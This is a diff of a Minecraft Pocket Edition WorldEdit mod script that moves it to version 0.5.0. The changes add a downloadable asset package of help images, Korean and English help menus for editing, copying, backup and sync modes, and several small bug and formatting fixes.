@@ -1,5 +1,5 @@
 /*
- * Copyright 2015 CodeInside
+ * Copyright 2015 SemteulGaram
  *
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
@@ -17,16 +17,14 @@
 const NAME = "WorldEdit script";
 const NAME_CODE = "WorldEdit";
 //Season . Release Number . Commits
-const VERSION = "0.4.0";
+const VERSION = "0.5.0";
 const VERSION_CODE = 110;
+const ASSETS_VERSION = 1;
 const TAG = "[" + "WorldEdit" + " " + VERSION + "] ";
 
 /**
  * TODOS
  *
- * LangSetting(MessageManager)
- * AssetsManager
- * DocumentMethod
  * HelpPage
  * WhiteList
  * ServerMessage
@@ -169,9 +167,10 @@ function showError(e) {
 
 
 
-var sgUrls = {}
-sgUrls.font = "https://www.dropbox.com/s/y1o46b2jkbxwl3o/minecraft.ttf?dl=1";
-sgUrls.logo = "https://www.dropbox.com/s/iqolfhsqwppu4bo/logo.ast?dl=1";
+var sgUrls = {
+	font: "https://www.dropbox.com/s/y1o46b2jkbxwl3o/minecraft.ttf?dl=1",
+	pkg: "https://www.dropbox.com/s/0vdmuiyvhtlv2bj/wes1.pkg?dl=1"
+}
 
 
 
@@ -190,7 +189,7 @@ sgFiles.mapMod = function() {return new File(sgFiles.map, Level.getWorldDir() + 
 sgFiles.mapSetting = function() {return new File(sgFiles.map, Level.getWorldDir() + "/mods/" + NAME + ".json")}
 
 sgFiles.assets = new File(sgFiles.script, "assets");
-sgFiles.logo = new File(sgFiles.assets, "logo.ast");
+sgFiles.pkg = new File(sgFiles.assets, "wes.pkg");
 
 
 
@@ -1725,7 +1724,7 @@ sgUtils.gui = {
 			iv.setImageBitmap(bm);
 			lo.addView(iv);
 		}else {
-			var er = sgUtils.gui.mcFastText("This isn't instance of Image\n\n" + imageFile, sg.px*0x8, false, Color.RED);
+			var er = sgUtils.gui.mcFastText("This isn't instance of Image\n\n" + image, sg.px*0x8, false, Color.RED);
 			er.setGravity(Gravity.CENTER);
 			lo.addView(er);
 		}
@@ -1762,7 +1761,7 @@ sgUtils.gui = {
 			switch(doc[0]) {
 				case "t"://Text
 				var size = sg.px*0x10, color = Color.WHITE, shadow = false;
-				if(doc.lenth > 2) {
+				if(doc.length > 2) {
 					size = parseInt(doc[2]);
 					color = Color.parseColor(doc[3]);
 					shadow = doc[4] == true;
@@ -1779,6 +1778,7 @@ sgUtils.gui = {
 				continue;
 			}
 		}
+		return layout;
 	}
 }
 
@@ -3687,7 +3687,7 @@ var messageContainer = {
 		load: "Load",
 		next: "Next",
 		prev: "Previous",
-    close: "Close",
+		close: "Close",
 		fill: "Fill",
 		clear: "Clear",
 		replace: "Replace",
@@ -3716,7 +3716,7 @@ var messageContainer = {
 		edit: "Edit",
 		tool: "Tool",
 		setting: "Setting",
-    help: "Help",
+		help: "Help",
 		about: "About",
 		btn_vis: "Main button visible",
 		menu_loc: "Menu location",
@@ -3763,7 +3763,8 @@ var messageContainer = {
 		warn_lang_need_reboot: "언어 변경후에는 재부팅하시길 권장합니다",
 		warn_paste: "정말로 해당지역에 붙여넣기 하시겠습니까?",
 		warn_already_working: "이미 처리중인 작업이 있습니다",
-		warn_no_permisson: "No permission",
+		warn_no_permisson: "권한이 없습니다",
+		warn_net_connection: "인터넷이 연결되지 않았거나\n다운로드 서버가 작동하지 않습니다.",
 
 		cmd_usage: "Usage: ",
 		cmd_help: "help",
@@ -3828,7 +3829,34 @@ var messageContainer = {
 		cmd_flip_desc: "복사된 영역을 기준축 방향으로 대칭합니다",
 		cmd_rotation: "rotation",
 		cmd_rotation_usage: "@Rotation <Axis> <Degree>",
-		cmd_rotation_desc: "복사된 영역을 기준축으로 각도만큼 회전시킵니다"
+		cmd_rotation_desc: "복사된 영역을 기준축으로 각도만큼 회전시킵니다",
+		
+		help_pos: "위치 설정 도움말",
+		help_pos_content: "위치 설정법에는 크게 2가지가 있습니다.\n\n첫번째는 나무도끼(271:0)를 들고 블럭을 터치하면 '위치1'이 지정되고\n블럭을 길게 누르면 '위치2'가 지정됩니다.\n\n다른 방법으로는 명령어를 입력할 수 있습니다.\n채팅창에 '@위치1'이라고 치면 당신의 발 부분이 '위치1'로 지정되고\n'@위치2'라고 치면 당신의 발 부분이 '위치2'로 지정됩니다.\n\n명령어 기능을 잘 활용하면 공중에서도 위치 지정이 가능합니다.",
+		
+		help_edit: "에딧 도움말",
+		help_edit_fill: "채우기: 양끝의 꼭짓점를 각각 위치1,2로 지정하고 실행하면 각 꼭짓점 사이의 직육면체의 공간이 선택한 블럭으로 가득 채워집니다.",
+		help_edit_clear: "비우기: 양끝의 꼭짓점을 각각 위치1,2로 지정하고 실행하면 각 꼭짓점 사이의 직육면체의 공간이 위쪽부터 비워집니다.\n(액체나 흘러내리는 블럭을 비동기로 삭제할때 필요)",
+		help_edit_replace: "바꾸기: 양끝의 꼭지점을 각각 위치1,2로 지정하고 실행하면 각 꼭짓점 사이의 직육면체의 공간에 있는 블럭1이 블럭2로 교체됩니다.",
+		help_edit_wall: "벽: 양끝의 꼭짓점을 각각 위치1,2로 지정하고 실행하면 각 꼭짓점을 잇는 세로 4면의 공간이 선택한 블럭으로 채워집니다.",
+		help_edit_sphere: "구: 위치1을 중심으로 하는 정해진 반지름을 가지는 구를 생성합니다.\n(빈구 옵션은 내부를 채우지 않습니다)",
+		help_edit_hemi_sphere: "반구: 위치1을 중심으로 하는 정해진 반지름을 가지고 지정한 방향쪽으로 반구를 생성합니다.\n(빈반구 옵션은 내부를 채우지 않습니다)",
+		help_edit_circle: "원: 위치1을 중심으로 하는 정해진 반지름을 가지고 지정한 중심축 기준의 원을 생성합니다.\n(빈원 옵션은 내부를 채우지 않습니다)",
+		help_edit_semi_circle: "'반원'에딧: 위치1을 중심으로 하는 정해진 반지름을 가지고 지정한 중심축 기준의 지정한 방향의 반원을 생성합니다.\n(빈구 옵션은 내부를 채우지 않습니다)",
+		
+		help_copy: "복사/붙여넣기 도움말",
+		help_copy_copy: "복사: 위치1,2사이의 직육면체 공간을 클립보드에 복사합니다.",
+		help_copy_cut: "잘라내기: 위치1,2사이의 직육면체 공간을 클립보드에 복사하고 비웁니다.",
+		help_copy_paste: "붙여넣기: 클립보드에 복사된 영역을 위치1 기준으로 x+, y+, z+방향으로 붙여넣습니다.",
+ 		help_copy_flip: "대칭: 클립보드에 복사된 영역을 지정한 축 기준으로 대칭시킵니다.",
+		help_copy_rotation: "회전: 클립보드에 복사된 영역을 지정한 축 기준으로 지정한 각도만큼 회전합니다.",
+		
+		help_backup: "백업 도움말",
+		help_backup_backup: "블럭을 변경하는 작업을 할때 실수를 방지하기 위해 백업기능이 존재합니다.\n설정에서 '자동 백업'항목으로 활성화/비활성화 시킬 수 있습니다.\n이 항목을 끄면 에딧 속도는 더 빨라지지만 실수를 했을때 돌이킬 수 없으므로 끄지 않는걸 추천합니다.",
+		help_backup_restore: "백업된 영역을 복원하기 위해서는 '에딧'메뉴 최상단에 있는 '복원'을 누르시거나 '@복원' 명령어를 통해 복원시킬 수 있습니다.\n복원을 한번 더 실행하면 취소된 작업이 다시 실행됩니다.",
+		
+		help_sync: "작업타입 도움말",
+		help_sync_content: "동기: 비동기보다 훨씬 빠른 속도로 에딧합니다.\n대신 에딧하는 도중에는 움직이지 못하고 많은 양을 한꺼번에 에딧하면 마인크래프트가 멈출 수 있습니다.\n\n비동기: 동기보다는 느린 작업 속도를 가지지만 작업하는 도중에 다른일을 할 수가 있고 많은 양을 안전하게 에딧할 수 있습니다."
 	},
 
 	ko_KR: {
@@ -3840,7 +3868,7 @@ var messageContainer = {
 		load: "불러오기",
 		next: "다음",
 		prev: "이전",
-    close: "닫기",
+		close: "닫기",
 		fill: "채우기",
 		clear: "비우기",
 		replace: "바꾸기",
@@ -3869,7 +3897,7 @@ var messageContainer = {
 		edit: "에딧",
 		tool: "도구",
 		setting: "설정",
-    help: "도움말",
+		help: "도움말",
 		about: "대하여...",
 		btn_vis: "메인버튼 보이기",
 		menu_loc: "메뉴 위치",
@@ -3917,6 +3945,7 @@ var messageContainer = {
 		warn_paste: "정말로 해당지역에 붙여넣기 하시겠습니까?",
 		warn_already_working: "이미 처리중인 작업이 있습니다",
 		warn_no_permisson: "권한이 없습니다",
+		warn_net_connection: "인터넷이 연결되지 않았거나\n다운로드 서버가 작동하지 않습니다.",
 
 		cmd_usage: "사용법: ",
 		cmd_help: "도움말",
@@ -3983,10 +4012,32 @@ var messageContainer = {
 		cmd_rotation_usage: "@회전 <기준축> <각도>",
 		cmd_rotation_desc: "복사된 영역을 기준축으로 각도만큼 회전시킵니다",
 
-    help_pos: "위치 설정법",
-    help_pos_content: "위치 설정법에는 크게 2가지가 있습니다.\n\n첫번째는 나무도끼(271:0)를 들고 블럭을 터치하면 '위치1'이 지정되고\n블럭을 길게 누르면 '위치2'가 지정됩니다.\n\n다른 방법으로는 명령어를 입력할 수 있습니다.\n채팅창에 '@위치1'이라고 치면 당신의 발 부분이 '위치1'로 지정되고\n'@위치2'라고 치면 당신의 발 부분이 '위치2'로 지정됩니다.\n\n명령어 기능을 잘 활용하면 공중에서도 위치 지정이 가능합니다.",
-    help_edit: "에딧 하는법",
-    help_edit_fill: "- - -"
+		help_pos: "위치 설정 도움말",
+		help_pos_content: "위치 설정법에는 크게 2가지가 있습니다.\n\n첫번째는 나무도끼(271:0)를 들고 블럭을 터치하면 '위치1'이 지정되고\n블럭을 길게 누르면 '위치2'가 지정됩니다.\n\n다른 방법으로는 명령어를 입력할 수 있습니다.\n채팅창에 '@위치1'이라고 치면 당신의 발 부분이 '위치1'로 지정되고\n'@위치2'라고 치면 당신의 발 부분이 '위치2'로 지정됩니다.\n\n명령어 기능을 잘 활용하면 공중에서도 위치 지정이 가능합니다.",
+		
+		help_edit: "에딧 도움말",
+		help_edit_fill: "채우기: 양끝의 꼭짓점를 각각 위치1,2로 지정하고 실행하면 각 꼭짓점 사이의 직육면체의 공간이 선택한 블럭으로 가득 채워집니다.",
+		help_edit_clear: "비우기: 양끝의 꼭짓점을 각각 위치1,2로 지정하고 실행하면 각 꼭짓점 사이의 직육면체의 공간이 위쪽부터 비워집니다.\n(액체나 흘러내리는 블럭을 비동기로 삭제할때 필요)",
+		help_edit_replace: "바꾸기: 양끝의 꼭지점을 각각 위치1,2로 지정하고 실행하면 각 꼭짓점 사이의 직육면체의 공간에 있는 블럭1이 블럭2로 교체됩니다.",
+		help_edit_wall: "벽: 양끝의 꼭짓점을 각각 위치1,2로 지정하고 실행하면 각 꼭짓점을 잇는 세로 4면의 공간이 선택한 블럭으로 채워집니다.",
+		help_edit_sphere: "구: 위치1을 중심으로 하는 정해진 반지름을 가지는 구를 생성합니다.\n(빈구 옵션은 내부를 채우지 않습니다)",
+		help_edit_hemi_sphere: "반구: 위치1을 중심으로 하는 정해진 반지름을 가지고 지정한 방향쪽으로 반구를 생성합니다.\n(빈반구 옵션은 내부를 채우지 않습니다)",
+		help_edit_circle: "원: 위치1을 중심으로 하는 정해진 반지름을 가지고 지정한 중심축 기준의 원을 생성합니다.\n(빈원 옵션은 내부를 채우지 않습니다)",
+		help_edit_semi_circle: "'반원'에딧: 위치1을 중심으로 하는 정해진 반지름을 가지고 지정한 중심축 기준의 지정한 방향의 반원을 생성합니다.\n(빈구 옵션은 내부를 채우지 않습니다)",
+		
+		help_copy: "복사/붙여넣기 도움말",
+		help_copy_copy: "복사: 위치1,2사이의 직육면체 공간을 클립보드에 복사합니다.",
+		help_copy_cut: "잘라내기: 위치1,2사이의 직육면체 공간을 클립보드에 복사하고 비웁니다.",
+		help_copy_paste: "붙여넣기: 클립보드에 복사된 영역을 위치1 기준으로 x+, y+, z+방향으로 붙여넣습니다.",
+ 		help_copy_flip: "대칭: 클립보드에 복사된 영역을 지정한 축 기준으로 대칭시킵니다.",
+		help_copy_rotation: "회전: 클립보드에 복사된 영역을 지정한 축 기준으로 지정한 각도만큼 회전합니다.",
+		
+		help_backup: "백업 도움말",
+		help_backup_backup: "블럭을 변경하는 작업을 할때 실수를 방지하기 위해 백업기능이 존재합니다.\n설정에서 '자동 백업'항목으로 활성화/비활성화 시킬 수 있습니다.\n이 항목을 끄면 에딧 속도는 더 빨라지지만 실수를 했을때 돌이킬 수 없으므로 끄지 않는걸 추천합니다.",
+		help_backup_restore: "백업된 영역을 복원하기 위해서는 '에딧'메뉴 최상단에 있는 '복원'을 누르시거나 '@복원' 명령어를 통해 복원시킬 수 있습니다.\n복원을 한번 더 실행하면 취소된 작업이 다시 실행됩니다.",
+		
+		help_sync: "작업타입 도움말",
+		help_sync_content: "동기: 비동기보다 훨씬 빠른 속도로 에딧합니다.\n대신 에딧하는 도중에는 움직이지 못하고 많은 양을 한꺼번에 에딧하면 마인크래프트가 멈출 수 있습니다.\n\n비동기: 동기보다는 느린 작업 속도를 가지지만 작업하는 도중에 다른일을 할 수가 있고 많은 양을 안전하게 에딧할 수 있습니다."
 	}
 }
 
@@ -4023,6 +4074,11 @@ function WorldEdit() {
 	this.mainMenu = null;
 	this.loadingLayout = null;
 	this.loading = null;
+	
+	this.assets = {
+		getStream: function() {},
+		close: function() {}
+	};
 
 	this.readyInit = false;
 
@@ -4345,20 +4401,16 @@ WorldEdit.prototype = {
 		this.loading = new sgUtils.gui.progressBar(7);
 		this.loading.setText("Load WorldEdit script...");
 		this.loading.show();
-		//TODO 더 나은방식으로 자원관리하기
-		if(!sgFiles.logo.exists()) {
-			thread(function() {try {
-				sgFiles.assets.mkdirs();
-				sgFiles.noMedia.createNewFile();
-				sgUtils.net.download(sgFiles.logo, sgUrls.logo);
-			}catch(err) {showError(err)}}).start();
-		}
+		//에딧 그룹의 화이트 리스트 불러오기
+		this.editorGroup.init();
 		//설정 불러오기
+		this.loading.setText("Load Setting...");
 		this.loadSetting();
 		//언어 설정
 		this.loadLang();
 		this.asynchEditSpeed = parseInt(this.setting.WorkSpeed);
 		//메뉴와 버튼 빌드
+		this.loading.setText("Load GUI...");
 		this.buildButton();
 		this.buildMenu();
 		//메뉴 내부에서 나타나는 프로그래스바 미리 그리기
@@ -4413,10 +4465,38 @@ WorldEdit.prototype = {
 		this.blockIdLayout.addView(this.idEditText);
 		this.blockIdLayout.addView(damageTitle);
 		this.blockIdLayout.addView(this.damageEditText);
-		//에딧 그룹의 화이트 리스트 불러오기
-		this.editorGroup.init();
+		this.loading.setText("Load BlockImage...");
 		//블럭 이미지 빌드
 		this.buildBlockImages();
+		//자료 불러오기
+		this.loading.setText("Read assets data...");
+		if(sgFiles.pkg.exists()) {
+			try {
+				var ast = new sgUtils.io.loadZipAsset(sgFiles.pkg);
+				var stream = ast.getStream("#info");
+				if(stream === false) {
+					sgFiles.pkg.delete();
+				}else {
+					var ln = sgUtils.io.readFile(stream)[0];
+					if(!(parseInt(ln) >= ASSETS_VERSION)) {
+						sgFiles.pkg.delete();
+					}
+				}
+				this.assets = ast;
+			}catch(err) {
+				we_toast("Error: Fail to read assets data (" + err + ")", 2, 5000, true);
+				sgFiles.pkg.delete();
+			}
+		}
+		if(!sgFiles.pkg.exists()) {
+			sgFiles.assets.mkdirs();
+			this.loading.setText("Download assets...");
+			try {
+				sgUtils.net.download(sgFiles.pkg, sgUrls.pkg);
+			}catch(err) {
+				we_toast(msg("warn_net_connection"), 1, 5000, true);
+			}
+		}
 		//로딩 끝
 		this.readyInit = true;
 		//우측 하단의 로딩창 닫기
@@ -4478,7 +4558,7 @@ WorldEdit.prototype = {
 	},
 
 	loadLang: function() {
-		var type =  parseInt(this.get("Lang"));
+		var type = parseInt(this.get("Lang"));
 		if(type === 0) {
 			lang = sgUtils.io.loadMcpeSetting("game_language");
 		}else {
@@ -4510,7 +4590,7 @@ WorldEdit.prototype = {
 		this.buttonI.setOnTouchListener(View.OnTouchListener({onTouch: function(view, event) {try {
 			switch(event.action) {
 				case MotionEvent.ACTION_DOWN:
-  	   that.relX = event.getX();
+			 that.relX = event.getX();
 				that.relY = event.getY();
 				that.absX = event.getRawX();
 				that.absY = event.getRawY();
@@ -4640,9 +4720,9 @@ WorldEdit.prototype = {
 		this.mainMenu = new we_menu(msg("tag"));
 		//메인 메뉴 하위메뉴
 		var mm_edit = new we_menu(msg("edit"));
-		var mm_tool =  new we_menu(msg("tool"));
+		var mm_tool = new we_menu(msg("tool"));
 		var mm_setting = new we_menu(msg("setting"));
-    var mm_help = new we_menu(msg("help"));
+		var mm_help = new we_menu(msg("help"));
 		//에딧메뉴 하위 메뉴
 		var mme_circular = new we_menu(msg("circular"));
 		var mme_copy = new we_menu(msg("copy"));
@@ -4709,7 +4789,7 @@ WorldEdit.prototype = {
 			we_initEdit(parseInt(that.get("SafeMode")), parseInt(that.get("WorkType")), that.getLocalEditor(), EditType.ROTATION);
 		});
 		//설정메뉴 목록
-		mm_setting.addMenu(this.contentType.RUN_FUNCTION, "Language:\n" + this.langName[parseInt(this.get("Lang"))], function(view) {
+		mm_setting.addMenu(this.contentType.RUN_FUNCTION, function() {return "Language:\n" + that.langName[parseInt(that.get("Lang"))]}, function(view) {
 			var langIndex = parseInt(that.get("Lang"));
 			if(++langIndex >= that.langType.length) {
 				langIndex = 0;
@@ -4757,7 +4837,7 @@ WorldEdit.prototype = {
 				that.set("SafeMode", 0, true);
 			}
 		});
-		mm_setting.addMenu(this.contentType.TOGGLE, msg("work_type") + ":\n" + (that.get("WorkType") == 0 ? msg("sync") : msg("async")), function(bool) {
+		mm_setting.addMenu(this.contentType.TOGGLE, function() {return msg("work_type") + ":\n" + (that.get("WorkType") == 0 ? msg("sync") : msg("async"))}, function(bool) {
 			if(bool === undefined) {
 				return that.get("WorkType") == 1;
 			}else if(bool) {
@@ -4768,7 +4848,7 @@ WorldEdit.prototype = {
 				return msg("work_type") + ":\n" + msg("sync");
 			}
 		});
-		mm_setting.addMenu(this.contentType.RUN_FUNCTION, msg("async_work_speed") + ": " + that.get("WorkSpeed"), function(view) {
+		mm_setting.addMenu(this.contentType.RUN_FUNCTION, function() {return msg("async_work_speed") + ": " + that.get("WorkSpeed")}, function(view) {
 			var np = new NumberPicker(ctx);
 			var np_p = new sg.rlp(sg.px*0x100, sg.wc);
 			np.setLayoutParams(np_p);
@@ -4789,13 +4869,75 @@ WorldEdit.prototype = {
 			}, Gravity.CENTER, true);
 			dl.show();
 		});
-    //도움말 메뉴목록
+		//도움말 메뉴목록
     mm_help.addMenu(this.contentType.RUN_FUNCTION, msg("help_pos"), function(view) {
-      var dl = new we_dialog(msg("help_pos"), new sgUtils.gui.document([
-        ["t", msg("help_pos_content")]
-      ], Gravity.CENTER, [sg.px*4, sg.px*4, sg.px*4, sg.px*4]), null, null, msg("close"), function() {this.close()});
-      dl.show();
-    });
+			var dl = new we_dialog(msg("help_pos"), sgUtils.gui.document([
+				["t", msg("help_pos_content")]
+			], Gravity.CENTER, [sg.px*4, sg.px*4, sg.px*4, sg.px*4]), null, null, msg("close"), function() {this.close()}, Gravity.CENTER, true);
+			dl.show();
+		});
+    mm_help.addMenu(this.contentType.RUN_FUNCTION, msg("help_edit"), function(view) {
+			var dl = new we_dialog(msg("help_edit"), sgUtils.gui.document([
+				["t", msg("fill"), sg.px*0x20, "#ffff00", false],
+				["i", main.assets.getStream("fill.ast")],
+				["t", msg("help_edit_fill") + "\n\n"],
+				["t", msg("clear"), sg.px*0x20, "#ffff00", false],
+				["i", main.assets.getStream("clear.ast")],
+				["t", msg("help_edit_clear") + "\n\n"],
+				["t", msg("replace"), sg.px*0x20, "#ffff00", false],
+				["i", main.assets.getStream("replace.ast")],
+				["t", msg("help_edit_replace") + "\n\n"],
+				["t", msg("wall"), sg.px*0x20, "#ffff00", false],
+				["i", main.assets.getStream("wall.ast")],
+				["t", msg("help_edit_wall") + "\n\n"],
+				["t", msg("sphere"), sg.px*0x20, "#ffff00", false],
+				["i", main.assets.getStream("sphere.ast")],
+				["t", msg("help_edit_sphere") + "\n\n"],
+				["t", msg("hemi_sphere"), sg.px*0x20, "#ffff00", false],
+				["i", main.assets.getStream("hemi_sphere.ast")],
+				["t", msg("help_edit_hemi_sphere") + "\n\n"],
+				["t", msg("circle"), sg.px*0x20, "#ffff00", false],
+				["i", main.assets.getStream("circle.ast")],
+				["t", msg("help_edit_circle") + "\n\n"],
+				["t", msg("semi_circle"), sg.px*0x20, "#ffff00", false],
+				["i", main.assets.getStream("semi_circle.ast")],
+				["t", msg("help_edit_semi_circle") + "\n\n"]
+			], Gravity.CENTER, [sg.px*4, sg.px*4, sg.px*4, sg.px*4]), null, null, msg("close"), function() {this.close()}, Gravity.CENTER, true);
+			dl.show();
+		});
+		mm_help.addMenu(this.contentType.RUN_FUNCTION, msg("help_copy"), function(view) {
+			var dl = new we_dialog(msg("help_copy"), sgUtils.gui.document([
+				["i", main.assets.getStream("copy.ast")],
+				["t", msg("copy"), sg.px*0x20, "#ffff00", false],
+				["t", msg("help_copy_copy") + "\n\n"],
+				["t", msg("cut"), sg.px*0x20, "#ffff00", false],
+				["t", msg("help_copy_cut") + "\n\n"],
+				["t", msg("paste"), sg.px*0x20, "#ffff00", false],
+				["t", msg("help_copy_paste") + "\n\n"],
+				["t", msg("flip"), sg.px*0x20, "#ffff00", false],
+				["i", main.assets.getStream("flip.ast")],
+				["t", msg("help_copy_flip") + "\n\n"],
+				["t", msg("rotation"), sg.px*0x20, "#ffff00", false],
+				["i", main.assets.getStream("rotation.ast")],
+				["t", msg("help_copy_rotation") + "\n\n"]
+			], Gravity.CENTER, [sg.px*4, sg.px*4, sg.px*4, sg.px*4]), null, null, msg("close"), function() {this.close()}, Gravity.CENTER, true);
+			dl.show();
+		});
+		mm_help.addMenu(this.contentType.RUN_FUNCTION, msg("help_backup"), function(view) {
+			var dl = new we_dialog(msg("help_backup"), sgUtils.gui.document([
+				["t", msg("backup"), sg.px*0x20, "#ffff00", false],
+				["t", msg("help_backup_backup") + "\n\n"],
+				["t", msg("restore"), sg.px*0x20, "#ffff00", false],
+				["t", msg("help_backup_restore") + "\n\n"]
+			], Gravity.CENTER, [sg.px*4, sg.px*4, sg.px*4, sg.px*4]), null, null, msg("close"), function() {this.close()}, Gravity.CENTER, true);
+			dl.show();
+		});
+		mm_help.addMenu(this.contentType.RUN_FUNCTION, msg("help_sync"), function(view) {
+			var dl = new we_dialog(msg("help_sync"), sgUtils.gui.document([
+				["t", msg("help_sync_content") + "\n\n"]
+			], Gravity.CENTER, [sg.px*4, sg.px*4, sg.px*4, sg.px*4]), null, null, msg("close"), function() {this.close()}, Gravity.CENTER, true);
+			dl.show();
+		});
 
 		//기본 메뉴로 전환
 		this.changeMenu(this.mainMenu);
@@ -5025,6 +5167,7 @@ WorldEdit.prototype = {
 	},
 
 	about: function() {
+		var that = this;
 		//최상위 레이아웃
 		var lo = new sg.rl(ctx);
 		//마인크래프트식 배경
@@ -5056,7 +5199,7 @@ WorldEdit.prototype = {
 		lg.setGravity(Gravity.CENTER);
 
 		//메인 로고 이미지뷰
-		var iv = sgUtils.io.loadBitmapLayout(sgFiles.logo);
+		var iv = sgUtils.gui.loadBitmapLayout(main.assets.getStream("logo.ast"));
 		iv.setId(sgUtils.math.randomId());
 		var iv_p = new sg.llp(sg.mp, sg.px*0x100);
 		iv.setLayoutParams(iv_p);
@@ -5173,7 +5316,7 @@ we_menu.prototype = {
 			switch(con[0]) {
 				//REDIRECT_MENU
 				case 0:
-				var btn = sgUtils.gui.mcFastButton(con[1], sg.px*0x10, false, Color.WHITE, null, null, null, [sg.px*4, sg.px*8, sg.px*4, sg.px*8], null, sgAssets.weButton.ninePatch(), null, function(view) {try {
+				var btn = sgUtils.gui.mcFastButton((typeof con[1] === "function") ? con[1]() : con[1], sg.px*0x10, false, Color.WHITE, null, null, null, [sg.px*4, sg.px*8, sg.px*4, sg.px*8], null, sgAssets.weButton.ninePatch(), null, function(view) {try {
 					thread(function() {try {
 						main.changeMenu(view.getTag());
 					}catch(err) {
@@ -5185,7 +5328,7 @@ we_menu.prototype = {
 				break;
 				//RUN_FUNCTION
 				case 1:
-				var btn = sgUtils.gui.mcFastButton(con[1], sg.px*0x10, false, Color.WHITE, null, null, null, [sg.px*4, sg.px*8, sg.px*4, sg.px*8], null, sgAssets.weButton.ninePatch(), null, function(view) {try {
+				var btn = sgUtils.gui.mcFastButton((typeof con[1] === "function") ? con[1]() : con[1], sg.px*0x10, false, Color.WHITE, null, null, null, [sg.px*4, sg.px*8, sg.px*4, sg.px*8], null, sgAssets.weButton.ninePatch(), null, function(view) {try {
 					var func = view.getTag();
 					thread(function() {try {
 						func(view);
@@ -5199,7 +5342,7 @@ we_menu.prototype = {
 				//TOGGLE
 				case 2:
 				//현재 토글의 상태 (true, false)
-				var btn = sgUtils.gui.mcFastButton(con[1], sg.px*0x10, false, Color.WHITE, null, null, null, [sg.px*4, sg.px*8, sg.px*4, sg.px*8], null, con[2]() ? sgAssets.weButtonClick.ninePatch() : sgAssets.weButton.ninePatch(), null, function(view) {try {
+				var btn = sgUtils.gui.mcFastButton((typeof con[1] === "function") ? con[1]() : con[1], sg.px*0x10, false, Color.WHITE, null, null, null, [sg.px*4, sg.px*8, sg.px*4, sg.px*8], null, con[2]() ? sgAssets.weButtonClick.ninePatch() : sgAssets.weButton.ninePatch(), null, function(view) {try {
 					var func = view.getTag();
 					if(func()) {
 						var text = func(false);
@@ -5729,7 +5872,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 			var sv = new ScrollView(ctx);
 			var lo = new sg.ll(ctx);
 			lo.setOrientation(sg.ll.VERTICAL);
-			var b1 =  new sgUtils.gui.mcFastButton("X+", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b1 = new sgUtils.gui.mcFastButton("X+", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[3] = "x+";
 				we_toast(msg("msg_direction", false, null, [["d", "X+"]]));
 				dl2.close();
@@ -5737,7 +5880,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				atv.start();
 			});
 			b1.setBackgroundColor(Color.WHITE);
-			var b2 =  new sgUtils.gui.mcFastButton("X-", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b2 = new sgUtils.gui.mcFastButton("X-", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[3] = "x-";
 				we_toast(msg("msg_direction", false, null, [["d", "X-"]]));
 				dl2.close();
@@ -5745,7 +5888,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				atv.start();
 			});
 			b2.setBackgroundColor(Color.WHITE);
-			var b3 =  new sgUtils.gui.mcFastButton("Y+", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b3 = new sgUtils.gui.mcFastButton("Y+", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[3] = "y+";
 				we_toast(msg("msg_direction", false, null, [["d", "Y+"]]));
 				dl2.close();
@@ -5753,7 +5896,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				atv.start();
 			});
 			b3.setBackgroundColor(Color.WHITE);
-			var b4 =  new sgUtils.gui.mcFastButton("Y-", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b4 = new sgUtils.gui.mcFastButton("Y-", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[3] = "y-";
 				we_toast(msg("msg_direction", false, null, [["d", "Y-"]]));
 				dl2.close();
@@ -5761,7 +5904,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				atv.start();
 			});
 			b4.setBackgroundColor(Color.WHITE);
-			var b5 =  new sgUtils.gui.mcFastButton("Z+", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b5 = new sgUtils.gui.mcFastButton("Z+", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[3] = "z+";
 				we_toast(msg("msg_direction", false, null, [["d", "Z+"]]));
 				dl2.close();
@@ -5769,7 +5912,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 				atv.start();
 			});
 			b5.setBackgroundColor(Color.WHITE);
-			var b6 =  new sgUtils.gui.mcFastButton("Z-", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
+			var b6 = new sgUtils.gui.mcFastButton("Z-", null, false, sgColors.main, null, sg.px*0x100, sg.px*0x30, null, [sg.px*4, sg.px*4, sg.px*4, sg.px*4], null, null, function(view) {
 				editDetail[3] = "z-";
 				we_toast(msg("msg_direction", false, null, [["d", "Z-"]]));
 				dl2.close();
@@ -5834,7 +5977,7 @@ function we_initEdit(safeMode, workType, editor, editType, editDetail) {
 			var sv2 = new ScrollView(ctx);
 			var lo2 = new sg.ll(ctx);
 			lo2.setOrientation(sg.ll.VERTICAL);
